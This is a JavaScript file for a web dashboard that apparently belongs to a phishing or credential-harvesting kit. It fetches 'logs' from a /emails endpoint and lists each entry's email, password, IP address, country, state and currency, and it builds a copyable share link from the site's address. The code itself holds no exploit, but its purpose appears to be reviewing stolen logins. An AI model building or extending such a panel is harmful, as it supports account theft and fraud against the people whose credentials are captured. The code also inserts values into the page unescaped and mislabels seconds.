// For the Link Section
let userLinkCont = document.querySelector("#userlink");
let copyLink = document.querySelector("#copyLink");
let userLink = userLinkCont.querySelector("a");
let userName = userLink.innerText;
userLink.innerText = `hi`;
userLink.href = `${window.location.origin}`;

// To implement the copy function
copyLink.addEventListener("click", () => {
  let dummy = document.createElement("textarea");
  dummy.innerText = `yadayada ${userLink.innerText}`;
  document.body.appendChild(dummy);
  dummy.select();
  dummy.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(dummy);
  copyLink.innerText = "Copied!!";
  setTimeout(() => {
    copyLink.innerText = "Copy";
  }, 4000);
});

let skip = 0;
let limit = 5;
let loading = false;
let finished = false;
let emails = [];
const loadingElement = document.querySelector(".loading");
const loadMoreElement = document.querySelector("#loadMore");
document.addEventListener("scroll", () => {
  const rect = loadMoreElement.getBoundingClientRect();
  if (rect.top < window.innerHeight && !loading && !finished) {
    loadMore();
  }
});

function loadMore() {
  skip += limit;
  listEmails(false);
}

function listEmails(reset = true) {
  loading = true;
  if (reset) {
    console.log("ran");
    document.querySelector(".emails").innerHTML = "";
    skip = 0;
    finished = false;
  }
  for (let index = skip; index < skip + limit; index++) {
    if (index < emails.length) {
      createEmail(emails[index]);
      loadMoreElement.style.visibility = "visible";
    } else {
      console.log("fin");
      loadMoreElement.style.visibility = "hidden";
      finished = true;
      break;
    }
  }
  loadingElement.style.display = "none";

  loading = false;
}

let test = [
  {
    timeStamp: Date.now(),
    detailList: [
      {
        title: "Email",
        value: "tast",
      },
      {
        title: "Password",
        value: "tast",
      },
      {
        title: "IP Address",
        value: "tast",
      },
      {
        title: "Country",
        value: "tast",
      },
    ],
  },
];

function createEmail(email) {
  let struct = {
    timeStamp: email.date,
    detailList: [
      {
        title: "Email",
        value: `${email.email}`,
      },
      {
        title: "Password",
        value: `${email.password}`,
      },
      {
        title: "IP Address",
        value: `${email?.details?.ip}`,
      },
      {
        title: "Country",
        value: `${email?.details?.country}`,
      },
      {
        title: "State",
        value: `${email?.details?.state}`,
      },
      {
        title: "Currency",
        value: `${email.details?.currency}`,
      },
    ],
  };

  let timeStamp = document.createElement("span");
  //         <span id="time-stamp">
  timeStamp.classList.add("time-stamp");
  timeStamp.innerText = makeTimeStamp(struct.timeStamp);
  let openBtn = document.createElement("span");
  openBtn.classList.add("open-btn");
  openBtn.innerText = "Open";
  //         <span class="open-btn">Open</span>

  let emailCont = document.createElement("div");
  emailCont.classList.add("container");
  emailCont.classList.add("email");
  emailCont.classList.add("close-email");
  emailCont.appendChild(timeStamp);
  emailCont.appendChild(openBtn);
  elements = struct.detailList.map((detail) => {
    let detailLine = document.createElement("span");
    detailLine.classList.add("detail");
    detailLine.innerHTML = `
            
                <p>
                    <b>${detail.title}:</b>
                    
                    ${detail.value}
                </p>

            
            `;
    emailCont.appendChild(detailLine);
  });

  document.querySelector(".emails").appendChild(emailCont);
  setupemail(emailCont);
}

function makeTimeStamp(target) {
  let time = Math.trunc((Date.now() - target) / 1000);
  let minutes = Math.trunc(time / 60);
  let hours = Math.trunc(time / 3600);
  let days = Math.trunc(time / 86400);

  if (days > 0) {
    if (days === 1) {
      return "a day ago";
    } else {
      return `${days} days ago`;
    }
  } else if (hours > 0) {
    if (hours === 1) {
      return "An hour ago";
    } else {
      return `${hours} hours ago`;
    }
  } else if (minutes > 0) {
    if (minutes === 1) {
      return "A minute ago";
    } else if (minutes < 10) {
      return "A few minutes ago";
    } else {
      return `${minutes} minutes ago`;
    }
  } else {
    if (time === 1) {
      return "A second ago";
    } else if (time < 10) {
      return "A few seconds ago";
    } else {
      return `${minutes} seconds ago`;
    }
  }
}

// email behaviour

function closeAll() {
  let emails = document.querySelectorAll(".emails .email");
  emails.forEach((email) => {
    email.classList.add("close-email");
    let openBtn = email.querySelector(".open-btn");
    openBtn.innerText = "Open";
  });
}

function setupemail(email) {
  // To open and close emails
  let openBtn = email.querySelector(".open-btn");
  openBtn.addEventListener("click", () => {
    if (openBtn.innerText === "Open") {
      closeAll();
      email.classList.remove("close-email");
      openBtn.innerText = "Close";
    } else {
      email.classList.add("close-email");
      openBtn.innerText = "Open";
    }
  });
}

fetch(`${window.location.origin}/emails`)
  .then((response) => response.json())
  .then((result) => {
    emails = result.logs;
    emails = emails.reverse();

    listEmails();
  })
  .catch((err) => console.log(err));
// emails = test;
